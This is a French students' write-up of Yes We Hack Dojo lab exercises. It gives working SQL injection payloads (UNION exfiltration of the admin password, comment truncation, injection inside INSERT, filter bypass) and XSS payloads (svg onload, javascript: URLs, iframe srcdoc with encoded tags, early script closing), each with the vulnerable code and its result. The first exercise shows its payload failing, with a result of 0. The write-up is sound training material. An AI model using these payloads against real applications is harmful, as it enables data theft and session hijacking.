# Yes We Hack LAB

Groupe : Jullian BACLE, Clément JELEFF
> https://dojo-yeswehack.com/

## SOMMAIRE

- [SQL Injection](#SQL-Injection)
  - [Simple login Bypass](#Simple-login-Bypass)
  - [First exfiltration](#First-exfiltration)
  - [No LIMIT](#No-limit)
  - [Exploration](#Exploration)
  - [Injection in INSERT](#Injection-in-insert)
- [XSS](#XSS)

## SQL injection

### `Simple login Bypass`

Consignes :\
Essayez de trouver un moyen de vous connecter en tant qu'admin.

> **Goal :  is_valid_password = 1**

Code présent sur la page

```sql
SELECT 
  (`password` = '$pass') is_valid_password
FROM users 
WHERE username = 'admin' 
LIMIT 1;
```

Injection

```js
admin' OR 'a'='a
```

Résultat

```javascript
"is_valid_password": 0
```

Explication de l'injection :\
l'injection `OR 'a'='a` permet de contourner la vérification du mot de passe, en précisant seulement qu'il est `true`.

---

### `First exfiltration`

Consignes :\
Time to recover some data
Bypassing a password check is nice, but being able to read arbitrary data is better.

> **Goal: recover the admin password**

Code présent sur la page :

```sql
SELECT 
  username, email
FROM users 
WHERE email LIKE '%$email%' 
LIMIT 10;
```

Injection :

```sql
$email = x'='x' UNION SELECT id, password FROM users'
```

Résultat :

```json
[
  {
    "username": 1,
    "email": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  },

  [...]
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

Explication de l'injection :\
Utilisation de la commande `UNION` permettant de mettre bout à bout le résultat de plusieurs requête. Ainsi ça nous permet de faire passer un requête de demande d'id et de password sur la table users.

---

### `No LIMIT`

Consignes :\
This query should give us the any password, but the limit 0 prevent it.

> **Goal: recover the admin password**

Code présent sur la page :

```sql
SELECT password FROM users WHERE username = '$name' LIMIT 0;
```

Injection :

```js
admin' --
```

Résultat :

```json
[
  {
    "password": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  }
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

Explication de l'injection :\
Ici le problème étant `LIMIT 0`, puisqu'il n'affichera aucune ligne. Il se trouve à la fin de la commande SQL, et notre injection est faisable juste avant ce `LIMIT 0`. On a donc seulement à le commenter pour qu'il ne pose plus problème.

---

### `Exploration`

Consignes :\
Now that you are able to recover any data, try to explore the database.

> **Goal : recover the flag from the hidden table.**

Code présent sur la page :

```sql
SELECT email FROM users WHERE username = '$name' LIMIT 1;
```

Injection :

```sql
x'='x' UNION SELECT password FROM users WHERE password LIKE 'FLAG%'--
```

Résultat :

```json
[
  {
    "email": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  }
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

Explication de l'injection :\
On applique les 2 dernières injections apprises. En les combinants on peut rechercher ce que l'on veut.

---

### `Injection in INSERT`

Consignes :\
Sometimes the injection can occur in an INSERT statement.

> **Goal : recover the admin password.**

Code présent sur la page :

```sql
INSERT INTO maillinglist(email, enabled) VALUES ('$mail', TRUE);

-- return
SELECT 
  email, enabled
FROM maillinglist 
ORDER BY `id` DESC 
LIMIT 5;
```

Injection :

```sql
', (SELECT password FROM users WHERE username LIKE '%admin%'))--
```

Résultat :

```json
[
  {
    "email": "",
    "enabled": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  },
  {
    "email": "brenda57@hotmail.com",
    "enabled": 1
  },
  [...]
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

Explication de l'injection :\
Ici nous réalisons un requête imbriqué dans une commande `INSERT`, afin de récupèrer le mot de passe admin.

---

### `Filter bypass`

Consignes :\
Here your input is heavily transformed before being injected into the query.
While this make the exploitation more difficult, this shouldn’t stop you.

> **Goal : recover the admin password.**

Code présent sur la page :

```sql
SELECT 
  `username`, `email`
FROM `users`
WHERE `email` = '@company.name'
LIMIT 5;
```

Injection :

```sql
'UNION/**/SELECT/**/username,passpasswordword/**/FROM/**/users/**/WHERE/**/username='admin'--
```

Résultat :

```json
[
  {
    "username": "admin",
    "email": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  }
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

Explication de l'injection :\
Les 2 principales contraintes de cet exercice était le filtre qui replacé les espaces par des ".", et le filtre qui empêché d'utilisé le mot "password".\
Il est possible de simuler un espace en utilisant la commande de commentaire `/**/`.\
Enfin pour éviter le filtre empêchant d'écrire "password", il suffisait d'écrire `PASSpasswordWORD`, de cette façon le "password" du milieu sera supprimé, laissant `PASSWORD` libre d'utilisation.

---

# XSS
## Simple XSS

Le XSS est une vulnérabilité qui permet d'exécuter du code JavaScript sur une machine.
Les attaquants volent généralement les cookies de la victime pour ensuite se faire passer pour elle.


**Consigne :**
Essayez d'injecter du code javascript dans la page
Résultat attendu :  `alert(name)`

#### Code présent sur la page

```markup
<h1>Hello <script>alert(name)</script></h1>
```
**Solution trouvée :** 
```markup
<script>alert(name)</script>
```

**La fonction alert() permet de déclencher une alerte en Javascript sur son navigateur.**

## InnerHTML

**Consigne :**
Script non autorisé 

`<script></script>`Les tags scripts ne fonctionneront pas quand ils seront ajoutés via innerHTML, trouvez une autre solution pour exploiter la faille

**Goal:  `alert(name)`**

#### Code présent sur la page

```markup
<h1>Hello <span id="name"></span></h1>
<script>

const name = $name
document.getElementById("name").innerHTML = name

</script>

```
**Solution trouvée :** 
```markup
<svg onload='alert(name)'>
```
#### Code après attaque
```markup
<h1>Hello <span id="name"></span></h1>
<script> La fonction onload() permet à l'attaquant d'exécuter une attaque string après le chargement de la fenêtre

const name = "<svg onload='alert(name)'>"
document.getElementById("name").innerHTML = name

</script>
```

***La fonction onload() permet a l'attaquant d'exécuter une attaque string après le chargement de la fenêtre***

## JS urls

**Consigne :**

Lien direct vers la destination
Est ce que vous arriverez à trouver la faille XSS ici ?

But :  `alert(name)`  quand la victime clique sur le lien

#### Code présent sur la page
```markup
<a href="$name">Visit my profile</a>
```

**Solution trouvée :** 

Pour cette exercice on utilise le protocole `javascript:` pour déclencher l'exécution du code lorsque la liaison sera ouverte

**Réponse :** 
```markup
javascript:alert(name)
```
#### Code après attaque
```markup
<a href="javascript:alert(name)">Visit my profile</a>
```

#### Réponse du site :
```markup
Visit my profile
```



##  Eventless

**Consigne :**
Cette fois, les événements "script" et JavaScript sont mis sur liste noire.
Mais il existe encore un autre moyen de déclencher l'exécution de JS.

#### Code présent sur la page
```markup
</script><script>alert(name)</script>
```
```markup
<h1>Hello </__BLACKLISTED__><__BLACKLISTED__>alert(name)</__BLACKLISTED__></h1>
```



**Solution trouvée :** 
```markup
<iframe srcdoc='<&#115;cript>alert(parent.name)</&#115;cript>'>
```
#### Code après attaque

```markup
<h1>Hello  <iframe srcdoc='<&#115;cript>alert(parent.name)</&#115;cript>'></h1>
```

```markup
# Hello
" container.innerText = name
```

Grâce à l'astuce numéro 3 on savait qu'il fallait utiliser l'attribut srcdoc.  
Srcdoc permet de passer le document HTML comme attribut.  
Il faut ensuite tester petit à petit les lettres et paternes qui sont bloquées ou non.






##  HTML parser


**Consigne :**

Cette protection est-elle suffisante pour vous protéger contre les XSS ?
```markup
Objectif : alerte(nom)
```

#### Code présent sur la page

```markup
<h1>Hello <span id="name"></span></h1>
<script>
const container = document.getElementById("name")
const name = "</script><script>alert(name)</script>"
container.innerText = name
</script>
```

**Solution trouvée :** 
```markup
</script><script>alert(name)</script>
```

#### Code après attaque
```markup
<h1>Hello <span id="name"></span></h1>
<script>
const container = document.getElementById("name")
const name = "</script><script>alert(name)</script>"
container.innerText = name
</script>
```
#### Réponse du site :

```markup
Hello
" container.innerText = name
```

Comme l'analyse HTML passe en première, on peut utiliser la balise de fermeture </script> pour terminer le script plus tôt.
Ensuite, on injecte l'HTML pour déclencher l'exécution. 